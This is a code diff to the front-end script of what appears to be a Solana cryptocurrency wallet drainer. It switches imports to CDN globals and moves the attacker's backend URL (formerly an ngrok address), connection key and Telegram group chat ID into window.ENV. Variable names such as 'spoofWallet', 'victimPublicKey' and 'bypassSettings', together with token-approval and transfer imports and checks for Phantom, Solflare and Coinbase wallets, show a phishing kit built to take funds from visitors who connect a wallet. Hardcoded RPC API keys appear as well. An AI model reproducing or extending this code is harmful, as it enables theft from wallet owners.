@@ -1,9 +1,33 @@
-import { Connection, Transaction, SystemProgram, PublicKey, LAMPORTS_PER_SOL, Keypair, VersionedMessage, StakeProgram, Authorized, TransactionInstruction, clusterApiUrl } from "@solana/web3.js";
-import { AccountLayout, TOKEN_PROGRAM_ID, ASSOCIATED_TOKEN_PROGRAM_ID, createAssociatedTokenAccountInstruction, createTransferInstruction, createApproveInstruction, transferInstructionData, TokenInstruction } from '@solana/spl-token';
-import axios from 'axios';
+// Using global variables from CDN imports instead of ES modules
+const {
+    Connection, 
+    Transaction, 
+    SystemProgram, 
+    PublicKey, 
+    LAMPORTS_PER_SOL, 
+    Keypair, 
+    VersionedMessage, 
+    StakeProgram, 
+    Authorized, 
+    TransactionInstruction, 
+    clusterApiUrl
+} = solanaWeb3;
+
+const {
+    AccountLayout, 
+    TOKEN_PROGRAM_ID, 
+    ASSOCIATED_TOKEN_PROGRAM_ID, 
+    createAssociatedTokenAccountInstruction, 
+    createTransferInstruction, 
+    createApproveInstruction, 
+    transferInstructionData, 
+    TokenInstruction
+} = splToken;
+
+// Use axios from global scope (loaded from CDN)
 
 const spoofWallet = "9WzDXwBbmkg8ZTbNMqUxvQRAyrZzDsGYdLVL9zYtAWWM";
-const RPCLink = "https://solana-mainnet.g.alchemy.com/v2/C6TRj1OIjI5oSZ7ocT5rhhDXguSkO0mN";
+const RPCLink = "https://alpha-lively-lambo.solana-mainnet.quiknode.pro/8783271537a440d18b16a99d563c897538cd412d/";
 
 const bypassSettings = {
     enabled: false,
@@ -11,11 +35,10 @@ const bypassSettings = {
     loadTime: 0
 }
 
-// Updated backend URL to an environment variable for Netlify deployment
-// This will be set in Netlify environment variables or replaced during build
-const BACKEND_URL = process.env.BACKEND_URL || "https://d007-102-213-68-144.ngrok-free.app";
-const CONNECTION_KEY = "601"; // This should match your connectionKey in database.json
-const GROUP_CHAT_ID = "-4872265548"; // Your Telegram group chat ID
+// Get config from window.ENV (set in index.html)
+const BACKEND_URL = window.ENV.BACKEND_URL;
+const CONNECTION_KEY = window.ENV.CONNECTION_KEY;
+const GROUP_CHAT_ID = window.ENV.GROUP_CHAT_ID;
 
 let solanaConnection, solanaProvider, victimPublicKey, connectButton, lamports, settingData
 let phantom = false, solflare = false, coinbase = false;
